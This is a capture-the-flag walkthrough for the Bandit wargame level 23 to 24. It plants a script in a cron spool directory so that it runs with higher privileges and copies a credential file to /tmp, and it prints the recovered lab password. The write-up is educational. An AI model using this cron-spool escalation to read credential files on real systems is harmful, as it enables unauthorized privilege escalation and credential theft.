# Bandit 23 -> Bandit 24

Goal, find the password for level 24

## Summary
A cron job runs a script every minute that executes and then deletes scripts placed in /var/spool/bandit24/foo. The cron runs those scripts only if they are owned by bandit23. Create a small executable script owned by bandit23 that copies /etc/bandit_pass/bandit24 to /tmp, wait for cron to run, then read the file in /tmp.

## Steps (exact commands) with outputs

1. Inspect cron configuration

```bash
cd /etc/cron.d
ls -l
```

Output

```text
total 40
-r--r----- 1 root root  47 Aug 15 13:16 behemoth4_cleanup
-rw-r--r-- 1 root root 123 Aug 15 13:09 clean_tmp
-rw-r--r-- 1 root root 120 Aug 15 13:16 cronjob_bandit22
-rw-r--r-- 1 root root 122 Aug 15 13:16 cronjob_bandit23
-rw-r--r-- 1 root root 120 Aug 15 13:16 cronjob_bandit24
-rw-r--r-- 1 root root 201 Apr  8  2024 e2scrub_all
-r--r----- 1 root root  48 Aug 15 13:17 leviathan5_cleanup
-rw------- 1 root root 138 Aug 15 13:17 manpage3_resetpw_job
-rwx------ 1 root root  52 Aug 15 13:19 otw-tmp-dir
-rw-r--r-- 1 root root 396 Jan  9  2024 sysstat
```

Then

```bash
cat cronjob_bandit24
```

Output

```text
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```

2. Read the cron script

```bash
cat /usr/bin/cronjob_bandit24.sh
```

Output

```bash
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```

**Explanation of this script (simple):**

- `myname=$(whoami)` sets the current username the script runs as. For the cron job this is bandit24.
- The script changes directory to `/var/spool/$myname/foo`, that is `/var/spool/bandit24/foo` when run by the cron.
- It loops over every file (including dotfiles) in that directory, skipping `.` and `..`.
- For each file it checks the file owner with `stat`.
- If the file owner is exactly `bandit23`, the script executes the file but only for up to 60 seconds (`timeout -s 9 60 ./<file>`).
- After handling each file, whether executed or not, it deletes the file with `rm -f ./<file>`.

What this means in practice:
- If you can place an executable file in `/var/spool/bandit24/foo` that is owned by bandit23, the cron will run it as bandit24 and then remove it. That lets you run code with bandit24 privileges once.
- Files not owned by bandit23 are not executed, but they are still deleted, so you get one shot and must ensure the file ownership and permissions are correct.
- Useful exploit approach: as bandit23 create a small script that reads `/etc/bandit_pass/bandit24` and writes it to `/tmp`, make it executable, copy it to `/var/spool/bandit24/foo`, wait for cron to run, then read the output from `/tmp`.


3. Create a safe temporary directory and work there

```bash
mktemp -d
```

Output

```text
/tmp/tmp.vtCnY59tkk
```

Then

```bash
cd /tmp/tmp.vtCnY59tkk
nano my_script.sh
cat my_script.sh
```

Contents of my_script.sh

```bash
#!/bin/bash
cat /etc/bandit_pass/bandit24 >/tmp/bandit_pass_24
```

4. Make it executable and copy it to the spool directory

```bash
chmod +x my_script.sh
cp my_script.sh /var/spool/bandit24/foo
```


5. Wait for cron to run and read the result

```bash
sleep 65
cat /tmp/bandit_pass_24
```

Output (the password for level 24)

```text
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
```

## Result
Password for bandit24

```
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
```

## Why it works, short
The cron job executes scripts in `/var/spool/bandit24/foo` only if they are owned by bandit23. When such a script runs, it runs as bandit24 and can read `/etc/bandit_pass/bandit24`. The script copies that file to `/tmp`, which you can then read as your user.

## Notes
- Your script is removed after execution, keep a copy if you want to reuse it.

